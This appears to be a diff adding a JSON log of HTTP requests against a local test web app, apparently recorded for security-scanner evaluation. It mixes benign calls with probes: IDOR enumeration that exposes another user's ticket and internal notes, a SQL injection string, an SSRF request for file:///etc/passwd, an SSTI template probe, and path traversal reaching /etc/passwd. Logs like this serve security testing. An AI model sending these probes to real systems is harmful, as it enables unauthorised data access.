@@ -1,0 +1,390 @@
+[
+  {
+    "label": "register alice",
+    "method": "POST",
+    "url": "http://127.0.0.1:5002/api/register",
+    "request_headers": {
+      "User-Agent": "python-requests/2.34.2",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept": "*/*",
+      "Connection": "keep-alive",
+      "Content-Length": "85",
+      "Content-Type": "application/json"
+    },
+    "request_body": "{\"username\": \"alice_dd46c7\", \"password\": \"Passw0rd!\", \"email\": \"alice_dd46c7@t.test\"}",
+    "response_status": 201,
+    "response_headers": {
+      "Server": "Werkzeug/3.1.8 Python/3.14.7",
+      "Date": "Tue, 01 Sep 2026 05:21:44 GMT",
+      "Content-Type": "application/json",
+      "Content-Length": "30",
+      "Connection": "close"
+    },
+    "response_body": "{\"message\":\"account created\"}\n",
+    "ground_truth": "inconclusive",
+    "note": ""
+  },
+  {
+    "label": "register bob",
+    "method": "POST",
+    "url": "http://127.0.0.1:5002/api/register",
+    "request_headers": {
+      "User-Agent": "python-requests/2.34.2",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept": "*/*",
+      "Connection": "keep-alive",
+      "Content-Length": "81",
+      "Content-Type": "application/json"
+    },
+    "request_body": "{\"username\": \"bob_96e3fd\", \"password\": \"Passw0rd!\", \"email\": \"bob_96e3fd@t.test\"}",
+    "response_status": 201,
+    "response_headers": {
+      "Server": "Werkzeug/3.1.8 Python/3.14.7",
+      "Date": "Tue, 01 Sep 2026 05:21:44 GMT",
+      "Content-Type": "application/json",
+      "Content-Length": "30",
+      "Connection": "close"
+    },
+    "response_body": "{\"message\":\"account created\"}\n",
+    "ground_truth": "inconclusive",
+    "note": ""
+  },
+  {
+    "label": "alice creates ticket",
+    "method": "POST",
+    "url": "http://127.0.0.1:5002/api/tickets",
+    "request_headers": {
+      "User-Agent": "python-requests/2.34.2",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept": "*/*",
+      "Connection": "keep-alive",
+      "Authorization": "Bearer c2477e4e7520e93bff9e9d8eabc1620a11db9f4d9ca39db9",
+      "Content-Length": "48",
+      "Content-Type": "application/json"
+    },
+    "request_body": "{\"subject\": \"my printer\", \"body\": \"help please\"}",
+    "response_status": 201,
+    "response_headers": {
+      "Server": "Werkzeug/3.1.8 Python/3.14.7",
+      "Date": "Tue, 01 Sep 2026 05:21:45 GMT",
+      "Content-Type": "application/json",
+      "Content-Length": "29",
+      "Connection": "close"
+    },
+    "response_body": "{\"message\":\"ticket created\"}\n",
+    "ground_truth": "inconclusive",
+    "note": ""
+  },
+  {
+    "label": "alice lists own tickets",
+    "method": "GET",
+    "url": "http://127.0.0.1:5002/api/tickets",
+    "request_headers": {
+      "User-Agent": "python-requests/2.34.2",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept": "*/*",
+      "Connection": "keep-alive",
+      "Authorization": "Bearer c2477e4e7520e93bff9e9d8eabc1620a11db9f4d9ca39db9"
+    },
+    "request_body": "",
+    "response_status": 200,
+    "response_headers": {
+      "Server": "Werkzeug/3.1.8 Python/3.14.7",
+      "Date": "Tue, 01 Sep 2026 05:21:45 GMT",
+      "Content-Type": "application/json",
+      "Content-Length": "174",
+      "Connection": "close"
+    },
+    "response_body": "[{\"assigned_to\":null,\"body\":\"help please\",\"created_at\":\"1788240105\",\"created_by\":8,\"department\":\"support\",\"id\":3,\"priority\":\"normal\",\"status\":\"open\",\"subject\":\"my printer\"}]\n",
+    "ground_truth": "inconclusive",
+    "note": ""
+  },
+  {
+    "label": "bob reads ticket 1 (IDOR enum)",
+    "method": "GET",
+    "url": "http://127.0.0.1:5002/api/tickets/1",
+    "request_headers": {
+      "User-Agent": "python-requests/2.34.2",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept": "*/*",
+      "Connection": "keep-alive",
+      "Authorization": "Bearer 9998806d541fdf817e2e145abd1b012fbc647ed63d244eae"
+    },
+    "request_body": "",
+    "response_status": 200,
+    "response_headers": {
+      "Server": "Werkzeug/3.1.8 Python/3.14.7",
+      "Date": "Tue, 01 Sep 2026 05:21:45 GMT",
+      "Content-Type": "application/json",
+      "Content-Length": "344",
+      "Connection": "close"
+    },
+    "response_body": "{\"assigned_to\":2,\"body\":\"I keep getting an error when I try to sign in since yesterday.\",\"created_at\":\"1788178438\",\"created_by\":3,\"department\":\"support\",\"id\":1,\"internal_notes\":\"Customer called twice, sounding irate. Consider escalating if no reply in 24h.\",\"priority\":\"normal\",\"status\":\"open\",\"subject\":\"Cannot log in to the customer portal\"}\n",
+    "ground_truth": "inconclusive",
+    "note": "cross-identity authz"
+  },
+  {
+    "label": "bob reads ticket 2 (IDOR enum)",
+    "method": "GET",
+    "url": "http://127.0.0.1:5002/api/tickets/2",
+    "request_headers": {
+      "User-Agent": "python-requests/2.34.2",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept": "*/*",
+      "Connection": "keep-alive",
+      "Authorization": "Bearer 9998806d541fdf817e2e145abd1b012fbc647ed63d244eae"
+    },
+    "request_body": "",
+    "response_status": 404,
+    "response_headers": {
+      "Server": "Werkzeug/3.1.8 Python/3.14.7",
+      "Date": "Tue, 01 Sep 2026 05:21:45 GMT",
+      "Content-Type": "application/json",
+      "Content-Length": "29",
+      "Connection": "close"
+    },
+    "response_body": "{\"error\":\"ticket not found\"}\n",
+    "ground_truth": "inconclusive",
+    "note": "cross-identity authz"
+  },
+  {
+    "label": "bob reads ticket 3 (IDOR enum)",
+    "method": "GET",
+    "url": "http://127.0.0.1:5002/api/tickets/3",
+    "request_headers": {
+      "User-Agent": "python-requests/2.34.2",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept": "*/*",
+      "Connection": "keep-alive",
+      "Authorization": "Bearer 9998806d541fdf817e2e145abd1b012fbc647ed63d244eae"
+    },
+    "request_body": "",
+    "response_status": 200,
+    "response_headers": {
+      "Server": "Werkzeug/3.1.8 Python/3.14.7",
+      "Date": "Tue, 01 Sep 2026 05:21:45 GMT",
+      "Content-Type": "application/json",
+      "Content-Length": "192",
+      "Connection": "close"
+    },
+    "response_body": "{\"assigned_to\":null,\"body\":\"help please\",\"created_at\":\"1788240105\",\"created_by\":8,\"department\":\"support\",\"id\":3,\"internal_notes\":\"\",\"priority\":\"normal\",\"status\":\"open\",\"subject\":\"my printer\"}\n",
+    "ground_truth": "inconclusive",
+    "note": "cross-identity authz"
+  },
+  {
+    "label": "search normal",
+    "method": "GET",
+    "url": "http://127.0.0.1:5002/api/search?q=printer",
+    "request_headers": {
+      "User-Agent": "python-requests/2.34.2",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept": "*/*",
+      "Connection": "keep-alive",
+      "Authorization": "Bearer c2477e4e7520e93bff9e9d8eabc1620a11db9f4d9ca39db9"
+    },
+    "request_body": "",
+    "response_status": 404,
+    "response_headers": {
+      "Server": "Werkzeug/3.1.8 Python/3.14.7",
+      "Date": "Tue, 01 Sep 2026 05:21:45 GMT",
+      "Content-Type": "text/html; charset=utf-8",
+      "Content-Length": "207",
+      "Connection": "close"
+    },
+    "response_body": "<!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n",
+    "ground_truth": "inconclusive",
+    "note": ""
+  },
+  {
+    "label": "search SQLi probe",
+    "method": "GET",
+    "url": "http://127.0.0.1:5002/api/search?q=' OR '1'='1",
+    "request_headers": {
+      "User-Agent": "python-requests/2.34.2",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept": "*/*",
+      "Connection": "keep-alive",
+      "Authorization": "Bearer c2477e4e7520e93bff9e9d8eabc1620a11db9f4d9ca39db9"
+    },
+    "request_body": "",
+    "response_status": 404,
+    "response_headers": {
+      "Server": "Werkzeug/3.1.8 Python/3.14.7",
+      "Date": "Tue, 01 Sep 2026 05:21:45 GMT",
+      "Content-Type": "text/html; charset=utf-8",
+      "Content-Length": "207",
+      "Connection": "close"
+    },
+    "response_body": "<!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n",
+    "ground_truth": "inconclusive",
+    "note": "sqli"
+  },
+  {
+    "label": "fetch normal",
+    "method": "GET",
+    "url": "http://127.0.0.1:5002/api/fetch?url=http://127.0.0.1:5002/health",
+    "request_headers": {
+      "User-Agent": "python-requests/2.34.2",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept": "*/*",
+      "Connection": "keep-alive",
+      "Authorization": "Bearer c2477e4e7520e93bff9e9d8eabc1620a11db9f4d9ca39db9"
+    },
+    "request_body": "",
+    "response_status": 404,
+    "response_headers": {
+      "Server": "Werkzeug/3.1.8 Python/3.14.7",
+      "Date": "Tue, 01 Sep 2026 05:21:45 GMT",
+      "Content-Type": "text/html; charset=utf-8",
+      "Content-Length": "207",
+      "Connection": "close"
+    },
+    "response_body": "<!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n",
+    "ground_truth": "inconclusive",
+    "note": "ssrf surface"
+  },
+  {
+    "label": "fetch file:// SSRF",
+    "method": "GET",
+    "url": "http://127.0.0.1:5002/api/fetch?url=file:///etc/passwd",
+    "request_headers": {
+      "User-Agent": "python-requests/2.34.2",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept": "*/*",
+      "Connection": "keep-alive",
+      "Authorization": "Bearer c2477e4e7520e93bff9e9d8eabc1620a11db9f4d9ca39db9"
+    },
+    "request_body": "",
+    "response_status": 404,
+    "response_headers": {
+      "Server": "Werkzeug/3.1.8 Python/3.14.7",
+      "Date": "Tue, 01 Sep 2026 05:21:45 GMT",
+      "Content-Type": "text/html; charset=utf-8",
+      "Content-Length": "207",
+      "Connection": "close"
+    },
+    "response_body": "<!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n",
+    "ground_truth": "inconclusive",
+    "note": "ssrf"
+  },
+  {
+    "label": "render normal",
+    "method": "GET",
+    "url": "http://127.0.0.1:5002/api/render?template=hello",
+    "request_headers": {
+      "User-Agent": "python-requests/2.34.2",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept": "*/*",
+      "Connection": "keep-alive",
+      "Authorization": "Bearer c2477e4e7520e93bff9e9d8eabc1620a11db9f4d9ca39db9"
+    },
+    "request_body": "",
+    "response_status": 404,
+    "response_headers": {
+      "Server": "Werkzeug/3.1.8 Python/3.14.7",
+      "Date": "Tue, 01 Sep 2026 05:21:45 GMT",
+      "Content-Type": "text/html; charset=utf-8",
+      "Content-Length": "207",
+      "Connection": "close"
+    },
+    "response_body": "<!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n",
+    "ground_truth": "inconclusive",
+    "note": "ssti surface"
+  },
+  {
+    "label": "render SSTI probe",
+    "method": "GET",
+    "url": "http://127.0.0.1:5002/api/render?template={{7*7}}",
+    "request_headers": {
+      "User-Agent": "python-requests/2.34.2",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept": "*/*",
+      "Connection": "keep-alive",
+      "Authorization": "Bearer c2477e4e7520e93bff9e9d8eabc1620a11db9f4d9ca39db9"
+    },
+    "request_body": "",
+    "response_status": 404,
+    "response_headers": {
+      "Server": "Werkzeug/3.1.8 Python/3.14.7",
+      "Date": "Tue, 01 Sep 2026 05:21:45 GMT",
+      "Content-Type": "text/html; charset=utf-8",
+      "Content-Length": "207",
+      "Connection": "close"
+    },
+    "response_body": "<!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n",
+    "ground_truth": "inconclusive",
+    "note": "ssti"
+  },
+  {
+    "label": "download normal",
+    "method": "GET",
+    "url": "http://127.0.0.1:5002/api/download?file=test.txt",
+    "request_headers": {
+      "User-Agent": "python-requests/2.34.2",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept": "*/*",
+      "Connection": "keep-alive",
+      "Authorization": "Bearer c2477e4e7520e93bff9e9d8eabc1620a11db9f4d9ca39db9"
+    },
+    "request_body": "",
+    "response_status": 404,
+    "response_headers": {
+      "Server": "Werkzeug/3.1.8 Python/3.14.7",
+      "Date": "Tue, 01 Sep 2026 05:21:45 GMT",
+      "Content-Type": "text/html; charset=utf-8",
+      "Content-Length": "207",
+      "Connection": "close"
+    },
+    "response_body": "<!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n",
+    "ground_truth": "inconclusive",
+    "note": "traversal surface"
+  },
+  {
+    "label": "download traversal probe",
+    "method": "GET",
+    "url": "http://127.0.0.1:5002/api/download?file=../secret_config.txt",
+    "request_headers": {
+      "User-Agent": "python-requests/2.34.2",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept": "*/*",
+      "Connection": "keep-alive",
+      "Authorization": "Bearer c2477e4e7520e93bff9e9d8eabc1620a11db9f4d9ca39db9"
+    },
+    "request_body": "",
+    "response_status": 404,
+    "response_headers": {
+      "Server": "Werkzeug/3.1.8 Python/3.14.7",
+      "Date": "Tue, 01 Sep 2026 05:21:45 GMT",
+      "Content-Type": "text/html; charset=utf-8",
+      "Content-Length": "207",
+      "Connection": "close"
+    },
+    "response_body": "<!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n",
+    "ground_truth": "inconclusive",
+    "note": "path traversal"
+  },
+  {
+    "label": "download traversal deep",
+    "method": "GET",
+    "url": "http://127.0.0.1:5002/api/download?file=../../../../etc/passwd",
+    "request_headers": {
+      "User-Agent": "python-requests/2.34.2",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "Accept": "*/*",
+      "Connection": "keep-alive",
+      "Authorization": "Bearer c2477e4e7520e93bff9e9d8eabc1620a11db9f4d9ca39db9"
+    },
+    "request_body": "",
+    "response_status": 404,
+    "response_headers": {
+      "Server": "Werkzeug/3.1.8 Python/3.14.7",
+      "Date": "Tue, 01 Sep 2026 05:21:45 GMT",
+      "Content-Type": "text/html; charset=utf-8",
+      "Content-Length": "207",
+      "Connection": "close"
+    },
+    "response_body": "<!doctype html>\n<html lang=en>\n<title>404 Not Found</title>\n<h1>Not Found</h1>\n<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>\n",
+    "ground_truth": "inconclusive",
+    "note": "path traversal"
+  }
+]
